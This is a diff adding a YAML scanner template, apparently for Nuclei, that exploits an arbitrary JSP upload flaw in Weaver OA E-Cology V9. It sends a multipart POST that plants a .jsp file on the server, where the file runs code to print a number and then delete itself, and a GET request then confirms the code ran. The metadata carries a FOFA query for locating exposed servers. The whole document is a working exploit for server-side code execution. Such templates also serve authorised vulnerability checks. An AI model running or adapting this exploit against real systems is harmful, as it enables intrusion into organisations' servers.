@@ -1,0 +1,51 @@
+id: poc-local-oa-weaver-ecology-v9-arbitrary-file-upload
+
+info:
+  name: 泛微OA E-Cology uploadOperation.jsp 任意文件上传
+  author: capiton
+  severity: critical
+  description: 泛微OA V9 存在文件上传接口导致任意文件上传
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20uploadOperation.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html
+  metadata:
+    fofa-query: app="泛微-协同办公OA"
+    Vulnerability-Impact: 泛微OA V9
+  tags: weaver,ecology,fanwei
+
+variables:
+    r2: "{{rand_int(40000, 44800)}}"
+    r3: "{{rand_int(40000, 44800)}}"
+    res: '{{to_number(r2) * to_number(r3)}}'
+
+requests:
+  - method: POST
+    path:
+      - "{{RootURL}}/page/exportImport/uploadOperation.jsp"
+    headers:
+        Content-Type: multipart/form-data; boundary=b0d829daa06c13d6b3e16b0ad21d1eed
+    body: "\
+        --b0d829daa06c13d6b3e16b0ad21d1eed\r\n\
+        Content-Disposition: form-data; name=\"file\"; filename=\"{{randstr}}.jsp\"\r\n\
+        Content-Type: application/octet-stream\r\n\
+        \r\n\
+        <%out.print({{r2}} * {{r3}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n\
+        --b0d829daa06c13d6b3e16b0ad21d1eed--\r\n\
+        "
+  - method: GET
+    path:
+      - "{{RootURL}}/page/exportImport/fileTransfer/{{randstr}}.jsp"
+
+
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        condition: and
+        status:
+          - 200
+
+      - type: word
+        part: body
+        condition: and   
+        words:  
+          - "{{res}}"
